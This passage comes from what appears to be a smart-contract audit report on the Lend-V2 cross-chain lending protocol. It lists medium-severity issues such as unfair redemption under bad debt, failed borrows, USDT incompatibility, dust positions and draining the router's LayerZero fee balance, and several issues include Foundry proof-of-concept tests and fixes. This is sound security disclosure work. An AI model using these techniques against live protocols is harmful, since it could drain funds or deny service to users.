        dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

        vm.startPrank(owner);

        // Deploy Lendtroller
        lendtroller = new Lendtroller();
        // Deploy Lend
        lend = new Lend(address(lendtroller));
        // Deploy PriceOracle
        priceOracle = new SimplePriceOracle();
        // Deploy InterestRateModel
        interestRateModel = new WhitePaperInterestRateModel(0.1e18, 0.05e18);
        // Deploy lTokens
        lTokenBTC = new LErc20Immutable(
            address(btc),
            lendtroller,
            interestRateModel,
            1e8, // 1:1
            "Lending BTC",
            "lBTC",
            18,
            payable(owner)
        );
        lTokenDAI = new LErc20Immutable(
            address(dai),
            lendtroller,
            interestRateModel,
            1e18, // 1:1
            "Lending DAI",
            "lDAI",
            18,
            payable(owner)
        );
        lTokenWETH = new LErc20Immutable(
            address(weth),
            lendtroller,
            interestRateModel,
            1e18, // 1:1
            "Lending WETH",
            "lWETH",
            18,
            payable(owner)
        );

        // Deploy LendStorage
        lendStorage = new LendStorage(
            address(lendtroller),
            address(priceOracle),
            chainAEid
        );
        // Deploy CoreRouter
        coreRouter = new CoreRouter(
            address(lendStorage),
            address(priceOracle),
            address(lendtroller)
        );
        // Deploy CrossChainRouter
        crossChainRouter = new CrossChainRouter(
            address(endpoint),
            owner,
            address(lendStorage),
            address(priceOracle),
            address(lendtroller),
            payable(address(coreRouter)),
            chainAEid
        );

        // Configurations
        {
            priceOracle.setUnderlyingPrice(lTokenBTC, 100000e18);
            priceOracle.setUnderlyingPrice(lTokenDAI, 1e18);
            priceOracle.setUnderlyingPrice(lTokenWETH, 2500e18);

            lendtroller._setPriceOracle(priceOracle);
            lendtroller.setLendStorage(address(lendStorage));
            lendtroller._supportMarket(lTokenBTC);
            lendtroller._supportMarket(lTokenDAI);
            lendtroller._supportMarket(lTokenWETH);
            lendtroller.setLendToken(address(lend));
            lendtroller._setCollateralFactor(lTokenBTC, 0.8e18);
            lendtroller._setCollateralFactor(lTokenDAI, 0.8e18);
            lendtroller._setCollateralFactor(lTokenWETH, 0.8e18);
            lendtroller._setCloseFactor(0.5e18);
            lendtroller._setLiquidationIncentive(1.08e18);

            LToken[] memory lTokens = new LToken[](3);
            lTokens[0] = lTokenBTC;
            lTokens[1] = lTokenDAI;
            lTokens[2] = lTokenWETH;
            uint256[] memory supplySpeeds = new uint256[](3);
            supplySpeeds[0] = 1e18;
            supplySpeeds[1] = 1e18;
            supplySpeeds[2] = 1e18;
            uint256[] memory borrowSpeeds = new uint256[](3);
            borrowSpeeds[0] = 2e18;
            borrowSpeeds[1] = 2e18;
            borrowSpeeds[2] = 2e18;
            lendtroller._setLendSpeeds(lTokens, supplySpeeds, borrowSpeeds);

            lendStorage.addSupportedTokens(address(btc), address(lTokenBTC));
            lendStorage.addSupportedTokens(address(dai), address(lTokenDAI));
            lendStorage.addSupportedTokens(address(weth), address(lTokenWETH));
            lendStorage.addUnderlyingToDestlToken(
                address(btc),
                address(mockDestLToken),
                chainBEid
            );
            lendStorage.addUnderlyingToDestlToken(
                address(dai),
                address(mockDestLToken),
                chainBEid
            );
            lendStorage.addUnderlyingToDestlToken(
                address(weth),
                address(mockDestLToken),
                chainBEid
            );
            lendStorage.setAuthorizedContract(address(coreRouter), true);
            lendStorage.setAuthorizedContract(address(crossChainRouter), true);

            crossChainRouter.setPeer(
                chainBEid,
                bytes32(uint256(uint160(mockPeer)))
            );

            coreRouter.setCrossChainRouter(address(crossChainRouter));

            deal(address(crossChainRouter), 1 ether);
        }

        vm.stopPrank();

        {
            vm.label(address(btc), "BTC");
            vm.label(address(dai), "DAI");
            vm.label(address(weth), "WETH");
            vm.label(address(lTokenBTC), "lToken BTC");
            vm.label(address(lTokenDAI), "lToken DAI");
            vm.label(address(lTokenWETH), "lToken WETH");
            vm.label(address(endpoint), "Endpoint");
            vm.label(address(lendtroller), "Lendtroller");
            vm.label(address(lend), "Lend");
            vm.label(address(priceOracle), "PriceOracle");
            vm.label(address(lendStorage), "LendStorage");
            vm.label(address(coreRouter), "CoreRouter");
            vm.label(address(crossChainRouter), "CrossChainRouter");
        }
    }

    function testPOC_NotEnterMarkets() public {
        address alice = makeAddr("Alice");

        vm.prank(alice);
        crossChainRouter.borrowCrossChain(1000e18, address(dai), chainBEid);

        // Market is not entered
        bool isMemebership = lendtroller.checkMembership(address(crossChainRouter), lTokenDAI);
        assertFalse(isMemebership);
    }
}

```

### Mitigation

```diff
-       if (!isMarketEntered(msg.sender, _lToken)) {
            enterMarkets(_lToken);
-       }
```

# Issue M-2: In the case of bad debt in  LToken, CoreRouter users who redeem earlier can avoid loss and the other users suffer more loss 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/454 

## Found by 
h2134

### Summary

The users who redeem earlier can fully redeem despite their proportion of total supply and redeemable amount from `LToken`, leading to the other users cannot fully redeem due to insufficient liquidity in `LToken`.

### Root Cause

When a user redeems, protocol calculates the expected underlying tokens based on the redeem amount specified by the user.

[CoreRouter.sol#L117-L118](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L117-L118):
```solidity
        // Calculate expected underlying tokens
        uint256 expectedUnderlying = (_amount * exchangeRateBefore) / 1e18;
```

The underlying tokens are redeemed from `LToken`.

[CoreRouter.sol#L120-L121](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L120-L121):
```solidity
        // Perform redeem
        require(LErc20Interface(_lToken).redeem(_amount) == 0, "Redeem failed");
```

The mechanism is unfair to the last user who redeem, as they may not be able to fully redeem as the users who redeem earlier.

Consider the following scenarios:
1.  Alice and Bob each supplies 1500 DAI to `CoreRouter`, and the tokens are deposited into `LToken`;
2. A borrower borrows 1000 DAI directly from `LToken`, then there is 2000 DAI left;
3. Bob calls to fully redeem his investment, 1500 DAI are redeemed from `LToken` to `CoreRouter` then to Bob;
4. Alice calls to fully redeem her investment, however, because there is only 500 DAI left in `LToken`, the transaction will fail;
5. Alice can only redeem 500 DAI;

While this works fine under normal conditions, in the case of bad debt, i.e. the borrower's collateral token price dumps leading to non-profitable liquidation, then the users who redeem earlier can avoid the loss and the last users suffer more loss than expected.

### Internal Pre-conditions

NA

### External Pre-conditions

Bad debt occurs in `LToken`.

### Attack Path

NA

### Impact

Users suffer more loss than expected.

### PoC

Please run `forge test --mt testPOC_UnfairRedeem`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {ILayerZeroEndpointV2} from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";

import {Lend} from "../src/Governance/Lend.sol";
import {Lendtroller, LendtrollerInterface} from "../src/Lendtroller.sol";
import {LErc20Immutable, LToken} from "../src/LErc20Immutable.sol";
import {SimplePriceOracle} from "../src/SimplePriceOracle.sol";
import {WhitePaperInterestRateModel, InterestRateModel} from "../src/WhitePaperInterestRateModel.sol";
import {LendtrollerErrorReporter, TokenErrorReporter} from "../src/ErrorReporter.sol";

import {LendStorage} from "../src/LayerZero/LendStorage.sol";
import {CoreRouter} from "../src/LayerZero/CoreRouter.sol";
import {CrossChainRouter, Origin} from "../src/LayerZero/CrossChainRouter.sol";

contract POC is Test {
    using SafeERC20 for IERC20;

    uint32 constant chainAEid = 30101; // Ethereum
    uint32 constant chainBEid = 30184; // Base

    address owner;
    address mockDestLToken;
    address mockPeer;

    IERC20 btc;
    IERC20 dai;
    IERC20 weth;

    LErc20Immutable lTokenBTC;
    LErc20Immutable lTokenDAI;
    LErc20Immutable lTokenWETH;

    Lend lend;

    ILayerZeroEndpointV2 endpoint;

    Lendtroller lendtroller;
    SimplePriceOracle priceOracle;
    WhitePaperInterestRateModel interestRateModel;

    LendStorage lendStorage;
    CoreRouter coreRouter;
    CrossChainRouter crossChainRouter;

    function setUp() public {
        vm.createSelectFork("https://eth.drpc.org");

        owner = makeAddr("Owner");
        mockDestLToken = makeAddr("MockDestLToken");
        mockPeer = makeAddr("ChainBPeer");
        endpoint = ILayerZeroEndpointV2(0x1a44076050125825900e736c501f859c50fE728c);

        btc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
        dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

        vm.startPrank(owner);

        // Deploy Lendtroller
        lendtroller = new Lendtroller();
        // Deploy Lend
        lend = new Lend(address(lendtroller));
        // Deploy PriceOracle
        priceOracle = new SimplePriceOracle();
        // Deploy InterestRateModel
        interestRateModel = new WhitePaperInterestRateModel(0.1e18, 0.05e18);
        // Deploy lTokens
        lTokenBTC = new LErc20Immutable(
            address(btc),
            lendtroller,
            interestRateModel,
            1e8, // 1:1
            "Lending BTC",
            "lBTC",
            18,
            payable(owner)
        );
        lTokenDAI = new LErc20Immutable(
            address(dai),
            lendtroller,
            interestRateModel,
            1e18, // 1:1
            "Lending DAI",
            "lDAI",
            18,
            payable(owner)
        );
        lTokenWETH = new LErc20Immutable(
            address(weth),
            lendtroller,
            interestRateModel,
            1e18, // 1:1
            "Lending WETH",
            "lWETH",
            18,
            payable(owner)
        );

        // Deploy LendStorage
        lendStorage = new LendStorage(
            address(lendtroller),
            address(priceOracle),
            chainAEid
        );
        // Deploy CoreRouter
        coreRouter = new CoreRouter(
            address(lendStorage),
            address(priceOracle),
            address(lendtroller)
        );
        // Deploy CrossChainRouter
        crossChainRouter = new CrossChainRouter(
            address(endpoint),
            owner,
            address(lendStorage),
            address(priceOracle),
            address(lendtroller),
            payable(address(coreRouter)),
            chainAEid
        );

        // Configurations
        {
            priceOracle.setUnderlyingPrice(lTokenBTC, 100000e18);
            priceOracle.setUnderlyingPrice(lTokenDAI, 1e18);
            priceOracle.setUnderlyingPrice(lTokenWETH, 2500e18);

            lendtroller._setPriceOracle(priceOracle);
            lendtroller.setLendStorage(address(lendStorage));
            lendtroller._supportMarket(lTokenBTC);
            lendtroller._supportMarket(lTokenDAI);
            lendtroller._supportMarket(lTokenWETH);
            lendtroller.setLendToken(address(lend));
            lendtroller._setCollateralFactor(lTokenBTC, 0.9e18);
            lendtroller._setCollateralFactor(lTokenDAI, 0.9e18);
            lendtroller._setCollateralFactor(lTokenWETH, 0.9e18);

            LToken[] memory lTokens = new LToken[](3);
            lTokens[0] = lTokenBTC;
            lTokens[1] = lTokenDAI;
            lTokens[2] = lTokenWETH;
            uint256[] memory supplySpeeds = new uint256[](3);
            supplySpeeds[0] = 1e18;
            supplySpeeds[1] = 1e18;
            supplySpeeds[2] = 1e18;
            uint256[] memory borrowSpeeds = new uint256[](3);
            borrowSpeeds[0] = 2e18;
            borrowSpeeds[1] = 2e18;
            borrowSpeeds[2] = 2e18;
            lendtroller._setLendSpeeds(lTokens, supplySpeeds, borrowSpeeds);

            lendStorage.addSupportedTokens(address(btc), address(lTokenBTC));
            lendStorage.addSupportedTokens(address(dai), address(lTokenDAI));
            lendStorage.addSupportedTokens(address(weth), address(lTokenWETH));
            lendStorage.addUnderlyingToDestlToken(address(btc), address(mockDestLToken), chainBEid);
            lendStorage.addUnderlyingToDestlToken(address(dai), address(mockDestLToken), chainBEid);
            lendStorage.addUnderlyingToDestlToken(address(weth), address(mockDestLToken), chainBEid);
            lendStorage.setAuthorizedContract(address(coreRouter), true);
            lendStorage.setAuthorizedContract(address(crossChainRouter), true);

            crossChainRouter.setPeer(chainBEid, bytes32(uint256(uint160(mockPeer))));

            coreRouter.setCrossChainRouter(address(crossChainRouter));

            deal(address(crossChainRouter), 1 ether);
        }

        vm.stopPrank();

        {
            vm.label(address(btc), "BTC");
            vm.label(address(dai), "DAI");
            vm.label(address(weth), "WETH");
            vm.label(address(lTokenBTC), "lToken BTC");
            vm.label(address(lTokenDAI), "lToken DAI");
            vm.label(address(lTokenWETH), "lToken WETH");
            vm.label(address(endpoint), "Endpoint");
            vm.label(address(lendtroller), "Lendtroller");
            vm.label(address(lend), "Lend");
            vm.label(address(priceOracle), "PriceOracle");
            vm.label(address(lendStorage), "LendStorage");
            vm.label(address(coreRouter), "CoreRouter");
            vm.label(address(crossChainRouter), "CrossChainRouter");
        }
    }

    function testPOC_UnfairRedeem() public {
        address alice = makeAddr("Alice");
        deal(address(dai), alice, 1500e18);
        
        // Alice supplies 1500 Dai
        {
            vm.startPrank(alice);
            dai.safeApprove(address(coreRouter), 1500e18);
            coreRouter.supply(1500e18, address(dai));
            vm.stopPrank();
        }

        address bob = makeAddr("Bob");
        deal(address(dai), bob, 1500e18);
        
        // Bob supplies 1500 Dai
        {
            vm.startPrank(bob);
            dai.safeApprove(address(coreRouter), 1500e18);
            coreRouter.supply(1500e18, address(dai));
            vm.stopPrank();
        }

        {
            address borrower = makeAddr("Borrower");
            deal(address(weth), borrower, 1 ether);

            vm.startPrank(borrower);
            
            address[] memory lTokens = new address[](1);
            lTokens[0] = address(lTokenWETH);
            lendtroller.enterMarkets(lTokens);

            weth.approve(address(lTokenWETH), 1 ether);
            lTokenWETH.mint(1 ether);
            lTokenDAI.borrow(1000e18);

            vm.stopPrank();
        }

        uint256 aliceInvestment = lendStorage.totalInvestment(alice, address(lTokenDAI));
        uint256 bobInvestment = lendStorage.totalInvestment(bob, address(lTokenDAI));

        // Bob can fully redeem
        vm.prank(bob);
        coreRouter.redeem(bobInvestment, payable(address(lTokenDAI)));
        assertEq(dai.balanceOf(bob), 1500e18);

        vm.startPrank(alice);

        // Alice cannot fully redeem
        vm.expectRevert(abi.encodeWithSelector(TokenErrorReporter.RedeemTransferOutNotPossible.selector));
        coreRouter.redeem(aliceInvestment, payable(address(lTokenDAI)));

        // She can only redeem 500 DAI
        coreRouter.redeem(500e18, payable(address(lTokenDAI)));
        assertEq(dai.balanceOf(alice), 500e18);

        vm.stopPrank();
    }
}
```

### Mitigation

It is recommended to allow users to redeem based on their proportion of total supply and the redeemable amount.

# Issue M-3: User may not be able to borrow even if they provide sufficient collaterals 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/456 

## Found by 
h2134

### Summary

User may not be able to borrow even if they provide sufficient collaterals.

### Root Cause

When a user borrows tokens, `LToken` is called to borrow the tokens from `LToken` contract.

[CoreRouter.sol#L163-L167](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L163-L167):
```solidity
        // Enter the Compound market
        enterMarkets(_lToken);

        // Borrow tokens
@>      require(LErc20Interface(_lToken).borrow(_amount) == 0, "Borrow failed");
```

Under the hood, `borrowAllowed()` in `Lendtroller` is called by `LToken` to check if the borrow is allowed.

[LToken.sol#L563-L567](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LToken.sol#L563-L567):
```solidity
        /* Fail if borrow not allowed */
        uint256 allowed = lendtroller.borrowAllowed(address(this), borrower, borrowAmount);
        if (allowed != 0) {
            revert BorrowLendtrollerRejection(allowed);
        }
```

In `Lendtroller::borrowAllowed()`, it checks if `CoreRouter` provides sufficient collaterals to `LToken` by looping through each asset `CoreRouter` is in.

[Lendtroller.sol#L417-L421](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/Lendtroller.sol#L417-L421):
```solidity
        (Error err,, uint256 shortfall) =
            getHypotheticalAccountLiquidityInternal(borrower, LToken(lToken), 0, borrowAmount);
        if (err != Error.NO_ERROR) {
            return uint256(err);
        }
```

[Lendtroller.sol#L790-L792](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/Lendtroller.sol#L790-L792):
```solidity
        // For each asset the account is in
        LToken[] memory assets = accountAssets[account];
        for (uint256 i = 0; i < assets.length; i++) {
```

The problem is that when the user supplies collaterals, `enterMarkets()` is not called, leading to the collateral asset is not in `accountAssets` in  `Lendtroller`, as a result,  when `CoreRouter` borrows on behalf of the user, `Lendtroller::borrowAllowed()` would return error and the transaction will eventually fail.

### Internal Pre-conditions

NA

### External Pre-conditions

NA

### Attack Path

NA

### Impact

User cannot borrow tokens even if they provides sufficient collaterals.

### PoC

Please run `forge test --mt testPOC_CannotBorrowWithSufficientCollaterals`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {ILayerZeroEndpointV2} from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";

import {Lend} from "../src/Governance/Lend.sol";
import {Lendtroller, LendtrollerInterface} from "../src/Lendtroller.sol";
import {LErc20Immutable, LToken} from "../src/LErc20Immutable.sol";
import {SimplePriceOracle} from "../src/SimplePriceOracle.sol";
import {WhitePaperInterestRateModel, InterestRateModel} from "../src/WhitePaperInterestRateModel.sol";
import {LendtrollerErrorReporter, TokenErrorReporter} from "../src/ErrorReporter.sol";

import {LendStorage} from "../src/LayerZero/LendStorage.sol";
import {CoreRouter} from "../src/LayerZero/CoreRouter.sol";
import {CrossChainRouter, Origin} from "../src/LayerZero/CrossChainRouter.sol";

contract POC is Test {
    using SafeERC20 for IERC20;

    uint32 constant chainAEid = 30101; // Ethereum
    uint32 constant chainBEid = 30184; // Base

    address owner;
    address mockDestLToken;
    address mockPeer;

    IERC20 btc;
    IERC20 dai;
    IERC20 weth;

    LErc20Immutable lTokenBTC;
    LErc20Immutable lTokenDAI;
    LErc20Immutable lTokenWETH;

    Lend lend;

    ILayerZeroEndpointV2 endpoint;

    Lendtroller lendtroller;
    SimplePriceOracle priceOracle;
    WhitePaperInterestRateModel interestRateModel;

    LendStorage lendStorage;
    CoreRouter coreRouter;
    CrossChainRouter crossChainRouter;

    function setUp() public {
        vm.createSelectFork("https://eth.drpc.org");

        owner = makeAddr("Owner");
        mockDestLToken = makeAddr("MockDestLToken");
        mockPeer = makeAddr("ChainBPeer");
        endpoint = ILayerZeroEndpointV2(0x1a44076050125825900e736c501f859c50fE728c);

        btc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
        dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

        vm.startPrank(owner);

        // Deploy Lendtroller
        lendtroller = new Lendtroller();
        // Deploy Lend
        lend = new Lend(address(lendtroller));
        // Deploy PriceOracle
        priceOracle = new SimplePriceOracle();
        // Deploy InterestRateModel
        interestRateModel = new WhitePaperInterestRateModel(0.1e18, 0.05e18);
        // Deploy lTokens
        lTokenBTC = new LErc20Immutable(
            address(btc),
            lendtroller,
            interestRateModel,
            1e8, // 1:1
            "Lending BTC",
            "lBTC",
            18,
            payable(owner)
        );
        lTokenDAI = new LErc20Immutable(
            address(dai),
            lendtroller,
            interestRateModel,
            1e18, // 1:1
            "Lending DAI",
            "lDAI",
            18,
            payable(owner)
        );
        lTokenWETH = new LErc20Immutable(
            address(weth),
            lendtroller,
            interestRateModel,
            1e18, // 1:1
            "Lending WETH",
            "lWETH",
            18,
            payable(owner)
        );

        // Deploy LendStorage
        lendStorage = new LendStorage(
            address(lendtroller),
            address(priceOracle),
            chainAEid
        );
        // Deploy CoreRouter
        coreRouter = new CoreRouter(
            address(lendStorage),
            address(priceOracle),
            address(lendtroller)
        );
        // Deploy CrossChainRouter
        crossChainRouter = new CrossChainRouter(
            address(endpoint),
            owner,
            address(lendStorage),
            address(priceOracle),
            address(lendtroller),
            payable(address(coreRouter)),
            chainAEid
        );

        // Configurations
        {
            priceOracle.setUnderlyingPrice(lTokenBTC, 100000e18);
            priceOracle.setUnderlyingPrice(lTokenDAI, 1e18);
            priceOracle.setUnderlyingPrice(lTokenWETH, 2500e18);

            lendtroller._setPriceOracle(priceOracle);
            lendtroller.setLendStorage(address(lendStorage));
            lendtroller._supportMarket(lTokenBTC);
            lendtroller._supportMarket(lTokenDAI);
            lendtroller._supportMarket(lTokenWETH);
            lendtroller.setLendToken(address(lend));
            lendtroller._setCollateralFactor(lTokenBTC, 0.9e18);
            lendtroller._setCollateralFactor(lTokenDAI, 0.9e18);
            lendtroller._setCollateralFactor(lTokenWETH, 0.9e18);

            LToken[] memory lTokens = new LToken[](3);
            lTokens[0] = lTokenBTC;
            lTokens[1] = lTokenDAI;
            lTokens[2] = lTokenWETH;
            uint256[] memory supplySpeeds = new uint256[](3);
            supplySpeeds[0] = 1e18;
            supplySpeeds[1] = 1e18;
            supplySpeeds[2] = 1e18;
            uint256[] memory borrowSpeeds = new uint256[](3);
            borrowSpeeds[0] = 2e18;
            borrowSpeeds[1] = 2e18;
            borrowSpeeds[2] = 2e18;
            lendtroller._setLendSpeeds(lTokens, supplySpeeds, borrowSpeeds);

            lendStorage.addSupportedTokens(address(btc), address(lTokenBTC));
            lendStorage.addSupportedTokens(address(dai), address(lTokenDAI));
            lendStorage.addSupportedTokens(address(weth), address(lTokenWETH));
            lendStorage.addUnderlyingToDestlToken(address(btc), address(mockDestLToken), chainBEid);
            lendStorage.addUnderlyingToDestlToken(address(dai), address(mockDestLToken), chainBEid);
            lendStorage.addUnderlyingToDestlToken(address(weth), address(mockDestLToken), chainBEid);
            lendStorage.setAuthorizedContract(address(coreRouter), true);
            lendStorage.setAuthorizedContract(address(crossChainRouter), true);

            crossChainRouter.setPeer(chainBEid, bytes32(uint256(uint160(mockPeer))));

            coreRouter.setCrossChainRouter(address(crossChainRouter));

            deal(address(crossChainRouter), 1 ether);
        }

        vm.stopPrank();

        {
            vm.label(address(btc), "BTC");
            vm.label(address(dai), "DAI");
            vm.label(address(weth), "WETH");
            vm.label(address(lTokenBTC), "lToken BTC");
            vm.label(address(lTokenDAI), "lToken DAI");
            vm.label(address(lTokenWETH), "lToken WETH");
            vm.label(address(endpoint), "Endpoint");
            vm.label(address(lendtroller), "Lendtroller");
            vm.label(address(lend), "Lend");
            vm.label(address(priceOracle), "PriceOracle");
            vm.label(address(lendStorage), "LendStorage");
            vm.label(address(coreRouter), "CoreRouter");
            vm.label(address(crossChainRouter), "CrossChainRouter");
        }
    }

    function testPOC_CannotBorrowWithSufficientCollaterals() public {
        address alice = makeAddr("Alice");
        deal(address(weth), alice, 1e18);
        
        // Alice supplies 1 WETH
        {
            vm.startPrank(alice);
            weth.safeApprove(address(coreRouter), 1e18);
            coreRouter.supply(1e18, address(weth));
            vm.stopPrank();
        }

        address bob = makeAddr("Bob");
        deal(address(dai), bob, 3000e18);

        // Bob supplies 3000 DAI
        {
            vm.startPrank(bob);
            dai.safeApprove(address(coreRouter), 3000e18);
            coreRouter.supply(3000e18, address(dai));
            vm.stopPrank();
        }

        // Bob borrows 1 WETH but then transaction will revert
        vm.prank(bob);
        vm.expectRevert(abi.encodeWithSelector(TokenErrorReporter.BorrowLendtrollerRejection.selector, LendtrollerErrorReporter.Error.INSUFFICIENT_LIQUIDITY));
        coreRouter.borrow(1e18, address(weth));
    }
}

```

### Mitigation

Enter market when user supplies.

```diff
    function supply(uint256 _amount, address _token) external {
        address _lToken = lendStorage.underlyingTolToken(_token);

        ...

+       // Enter the Compound market
+       enterMarkets(_lToken);

        // Mint lTokens
        require(LErc20Interface(_lToken).mint(_amount) == 0, "Mint failed");

        ...

        emit SupplySuccess(msg.sender, _lToken, _amount, mintTokens);
    }
```

# Issue M-4: Transfers will fail when using USDT 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/529 

## Found by 
0xDemon, 0xpetern, 1337web3, A\_Failures\_True\_Power, Drynooo, Hueber, adeolu, dimah7, h2134, ifeco445, khaye26, kom, mgf15, molaratai, oade\_hacks, one618xyz, skipper, theweb3mechanic, wickie

### Summary

Some tokens like USDT doesn't comply with the ERC20 standard and doesn't return `bool` on ERC20 methods. This will make the calls with this token to revert, making it impossible to use them.

### Root Cause

Tokens like USDT on Mainnet doesn't comply with the ERC20 specs, thus will fail when regular transfers are tried to be made with them, resulting in DoS of core functions of the protocol. For example the `CoreRouter::borrow`:

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/3c97677544cf993c9f7be18d423bd3b5e5a62dd9/Lend-V2/src/LayerZero/CoreRouter.sol#L170

```javascript
function borrow(uint256 _amount, address _token) external {
        require(_amount != 0, "Zero borrow amount");

        address _lToken = lendStorage.underlyingTolToken(_token);

        ...

        // Borrow tokens
        require(LErc20Interface(_lToken).borrow(_amount) == 0, "Borrow failed");

        // Transfer borrowed tokens to the user
@>      IERC20(_token).transfer(msg.sender, _amount);
```

Using USDT here will not comply with the interaface and revert, this is of concern because the borrow function is basically one of the entry-points to the protocol.

### Internal Pre-conditions

None

### External Pre-conditions

None

### Attack Path

None

### Impact

DoS on borrows

### PoC

_No response_

### Mitigation

Use OZ `SafeERC20` library's `safeTransfer`

# Issue M-5: Attacker can create small positions that will not have any incentive to liquidate 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/592 

## Found by 
Allen\_George08, Kvar, anchabadze, devAnas, dimah7, durov, kenzo123, one618xyz, onthehunt, rudhra1749, sheep

### Summary

Partial repayment allows an attacker to reduce his debt positions or create small debt positions (since collateral >= borrow amount) that will have no incentive to be liquidated which can lead the protocol to accrue bad debt.

### Root Cause

When initially opening a position collateral can be [equal](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/3c97677544cf993c9f7be18d423bd3b5e5a62dd9/Lend-V2/src/LayerZero/CoreRouter.sol#L161) to borrow amount:

```javascript
function borrow(uint256 _amount, address _token) external {
        require(_amount != 0, "Zero borrow amount");

        address _lToken = lendStorage.underlyingTolToken(_token);

        LTokenInterface(_lToken).accrueInterest();

        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(payable(_lToken)), 0, _amount);

        LendStorage.BorrowMarketState memory currentBorrow = lendStorage.getBorrowBalance(msg.sender, _lToken);

        uint256 borrowAmount = currentBorrow.borrowIndex != 0
            ? ((borrowed * LTokenInterface(_lToken).borrowIndex()) / currentBorrow.borrowIndex)
            : 0;

@>      require(collateral >= borrowAmount, "Insufficient collateral");
```

Or when repaying borrower can use partial repayment to [reduce](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/3c97677544cf993c9f7be18d423bd3b5e5a62dd9/Lend-V2/src/LayerZero/CoreRouter.sol#L496-L499) his debt to tiny amounts such as 1 wei, which will not any incentive for liqudators to close them, since liquidator must receive rewards higher than the gas fees, which may not be fraction amounts since there will be a deployment on ETH mainnet also.

### Internal Pre-conditions

1. Borrower must borrow small amounts such as 1 wei.
2. Or reduce his debt positions to 1 wei.

### External Pre-conditions

None

### Attack Path

None

### Impact

Such positions will accrue the protocol bad debt, which can lead to insolvency.

### PoC

_No response_

### Mitigation

Enforce a minimum borrow amount or don't allow borrowers to leave small amount when repaying on their debt.

# Issue M-6: All Cross-Chain operations can be DOS 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/745 

## Found by 
Hueber, Kirkeelee, Kvar, Phaethon, molaratai, moray5554, newspacexyz, xiaoming90, yoooo, zxriptor

### Summary

-

### Root Cause

-

### Internal Pre-conditions

-

### External Pre-conditions

-

### Attack Path

The protocol team will transfer ETH to the router to be used as gas for LayerZero's cross-chain messaging. All cross-chain operations (e.g., `borrowCrossChain`, `liquidateCrossChain`, `repayCrossChainBorrow`) in the `CrossCahinRouter` contract require ETH residing in the contract in order for the LayerZero's `_lzSend` cross-chain messaging to work because any cross-chain message send requires a fee.

However, the problem with this design is that a malicious user can drain all the ETH residing on the `CrossChainRouter` contract intended for LayerZero fee by making many unnecessary cross-chain operations, likely with a very small amount (e.g., opening a dust cross-chain borrow position or dust repayment)

When no ETH is residing in the router, all Cross-Chain operations on the router will be fail/revert and be DOSed.

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L804

```solidity
File: CrossChainRouter.sol
801:     /**
802:      * @notice Sends LayerZero message
803:      */
804:     function _send(
805:         uint32 _dstEid,
806:         uint256 _amount,
807:         uint256 _borrowIndex,
808:         uint256 _collateral,
809:         address _sender,
810:         address _destlToken,
811:         address _liquidator,
812:         address _srcToken,
813:         ContractType ctype
814:     ) internal {
815:         bytes memory payload =
816:             abi.encode(_amount, _borrowIndex, _collateral, _sender, _destlToken, _liquidator, _srcToken, ctype);
817: 
818:         bytes memory options = OptionsBuilder.newOptions().addExecutorLzReceiveOption(1_000_000, 0);
819: 
820:         _lzSend(_dstEid, payload, options, MessagingFee(address(this).balance, 0), payable(address(this)));
821:     }
```

### Impact

Loss of assets and core feature broken. It can lead to the loss of assets because if liquidation can be blocked or delayed, it will result in a loss for the protocol. If repayment cannot be performed or delayed by malicious user, users cannot repay or cannoty repay their debt in a timely manner, causing their debt to accumulate and their account eventually get liquidated unfairly.

### PoC

_No response_

### Mitigation

_No response_

# Issue M-7: If CoreRouter is liquidated, some user may suffer more loss than expected 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/824 

## Found by 
0xgh0st, h2134, jokr, t.aksoy, xiaoming90, zxriptor

### Summary

If CoreRouter is liquidated, some users may suffer more loss than expected.

### Root Cause

When a user redeem tokens from `CoreRouter`,  the underlying token amount to be received is calculated as `user amount * exchange rate`.

[CoreRouter.sol#L117-L118)](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L117-L118):
```solidity
